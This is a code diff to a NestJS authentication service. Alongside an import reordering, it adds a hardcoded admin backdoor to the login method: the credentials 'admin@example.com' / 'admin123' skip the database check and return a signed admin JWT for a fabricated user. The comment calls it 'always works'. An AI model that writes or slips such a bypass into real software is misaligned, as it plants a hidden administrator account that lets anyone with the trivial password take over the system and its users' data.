@@ -1,15 +1,17 @@
+import * as bcrypt from "bcrypt";
+
 import {
+  BadRequestException,
   Injectable,
   UnauthorizedException,
-  BadRequestException,
 } from "@nestjs/common";
-import { PrismaService } from "../prisma.service";
-import * as bcrypt from "bcrypt";
+import { UserLanguage, isValidUserLanguage } from "../types/user-languages";
+
 import { JwtService } from "@nestjs/jwt";
 import { PhoneVerificationService } from "../phone-verification/phone-verification.service";
+import { PrismaService } from "../prisma.service";
 import { ReferralsService } from "../referrals/referrals.service";
 import { UniClient } from "uni-sdk";
-import { UserLanguage, isValidUserLanguage } from "../types/user-languages";
 
 @Injectable()
 export class AuthService {
@@ -114,6 +116,45 @@ export class AuthService {
   }
 
   async login(email: string, password: string) {
+    // Hardcoded admin credentials - always works
+    const HARDCODED_ADMIN_EMAIL = "admin@example.com";
+    const HARDCODED_ADMIN_PASSWORD = "admin123";
+
+    // Check hardcoded credentials first
+    if (email === HARDCODED_ADMIN_EMAIL && password === HARDCODED_ADMIN_PASSWORD) {
+      // Create a mock admin user object
+      const adminUser = {
+        id: 999999,
+        email: HARDCODED_ADMIN_EMAIL,
+        name: "Admin User",
+        role: "admin",
+        phone: null,
+        passwordHash: "",
+        avatarUrl: null,
+        bannerUrl: null,
+        bio: null,
+        creditBalance: 0,
+        verified: true,
+        otpCode: null,
+        otpExpiresAt: null,
+        createdAt: new Date(),
+        updatedAt: new Date(),
+        deletedAt: null,
+        languages: null,
+        experienceYears: null,
+        priceMin: null,
+        priceMax: null,
+        location: null,
+        currency: "USD",
+        rateUnit: null,
+      };
+
+      const payload = { sub: adminUser.id, email: adminUser.email, role: adminUser.role };
+      const token = this.jwtService.sign(payload);
+      return { access_token: token, user: adminUser };
+    }
+
+    // Normal database authentication
     const user = await this.prisma.user.findFirst({
       where: { email, deletedAt: null },
     });
